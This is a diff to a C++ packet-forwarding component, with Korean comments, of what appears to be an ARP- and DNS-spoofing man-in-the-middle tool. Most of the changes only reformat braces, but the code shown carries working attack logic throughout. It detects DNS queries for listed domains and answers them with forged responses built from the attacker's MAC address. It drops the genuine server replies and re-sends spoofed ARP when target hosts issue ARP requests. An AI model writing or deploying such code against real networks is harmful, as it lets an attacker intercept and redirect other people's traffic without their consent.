@@ -106,13 +106,16 @@ void PacketForwarder::forward_loop()
     
     while (running) {
         res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) {
+        if (res == 0) 
+        {
             this_thread::sleep_for(chrono::microseconds(10));
             auto now = high_resolution_clock::now();
             if (duration_cast<seconds>(now - last_stat_time).count() >= 5)
                 last_stat_time = now;
             continue;
-        } else if (res < 0) {
+        } 
+        else if (res < 0) 
+        {
             cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << endl;
             break;
         }
@@ -122,7 +125,9 @@ void PacketForwarder::forward_loop()
             continue;
         
         if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
-            handle_arp_packet(packet, header->len);
+            {
+                handle_arp_packet(packet, header->len);
+            }
         else if (ntohs(eth->ether_type) == ETHERTYPE_IP) {
             struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
             if (ip_hdr->ip_p == IPPROTO_UDP) {
@@ -167,8 +172,10 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
     
     // 지정 도메인과 정확히 일치하는지 확인 (서브도메인 제외)
     bool matches = false;
-    for (const auto& spoof_domain : SPOOF_DOMAINS) {
-        if (domain == spoof_domain) {
+    for (const auto& spoof_domain : SPOOF_DOMAINS) 
+    {
+        if (domain == spoof_domain) 
+        {
             matches = true;
             break;
         }
@@ -178,12 +185,14 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
         return false; // 지정 도메인이 아니면 그대로 전달
     
     // 지정 도메일 경우, DNS 제작 요청 및 DROP
-    if (dst_port == DNS_PORT) {
+    if (dst_port == DNS_PORT) 
+    {
         // 클라이언트에서 서버로 보내는 DNS 요청
         cout << "DNS 요청 감지: " << domain << "\n";
         uint8_t* packet_copy = new uint8_t[packet_len];
         memcpy(packet_copy, packet, packet_len);
-        thread([this, packet_copy, packet_len, domain]() {
+        thread([this, packet_copy, packet_len, domain]() 
+        {
             dnsSpoofer->send_spoof_response(handle, packet_copy, packet_len,
                                              spoofer->get_attacker_mac(),
                                              spoofer->get_gateway_ip(),
@@ -191,9 +200,12 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
                                              spoofer->get_targets());
             delete[] packet_copy;
         }).detach();
+
         cout << "DNS 요청 차단: " << domain << "\n";
         return true;
-    } else if (src_port == DNS_PORT) {
+    } 
+    else if (src_port == DNS_PORT) 
+    {
         // 서버에서 클라이언트로 오는 정상 DNS 응답 (드랍)
         cout << "정상 DNS 응답 드랍: " << domain << "\n";
         return true;
@@ -217,7 +229,7 @@ void PacketForwarder::handle_arp_packet(const uint8_t* packet, size_t packet_len
     // ARP 요청인 경우만 처리 (ARPOP_REQUEST 값은 1)
     if (op == ARPOP_REQUEST) {
         for (const auto& target : spoofer->get_targets()) {
-            // target->get_ip()에 해당하는 IP가 ARP의 SPA 또는 TPA에 포함되어 있다면
+            // Target의 IP가 SPA OR TPA 있을 경우, ARP 전송 및 해당 PACKET DROP
             if (memcmp(arp->arp_spa, target->get_ip(), 4) == 0 ||
                 memcmp(arp->arp_tpa, target->get_ip(), 4) == 0) {
                 cout << "ARP 요청 감지: 대상 " << target->get_ip_str() 
